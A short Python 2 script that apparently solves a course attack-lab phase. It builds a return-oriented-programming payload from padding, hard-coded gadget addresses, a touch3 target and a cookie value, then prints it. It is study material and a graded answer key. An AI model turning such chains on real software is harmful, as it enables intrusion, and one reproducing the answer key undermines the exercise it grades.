touch3 = "\x74\x1a\x40\x00" + "\x00"*4
cookie = "1a7dd803" +"\x00"*8
rsprax = "0000000000401b7b".decode('hex')[::-1]
raxrdi = "\x1b\x1b\x40\x00" + "\x00"*4
addxy  = "0000000000401b4c".decode('hex')[::-1]
poprax = "0000000000401b3b".decode('hex')[::-1]
edxesi = "0000000000401bc9".decode('hex')[::-1]
ecxedx = "0000000000401c0f".decode('hex')[::-1]
eaxecx = "0000000000401bde".decode('hex')[::-1]
#print len(movrsprax), len(add37eax), len(raxrdi)

shell = "A"*56 + rsprax + raxrdi + poprax + "0000000000000048".decode('hex')[::-1] + eaxecx + ecxedx + edxesi + addxy + raxrdi + touch3 + cookie
print shell
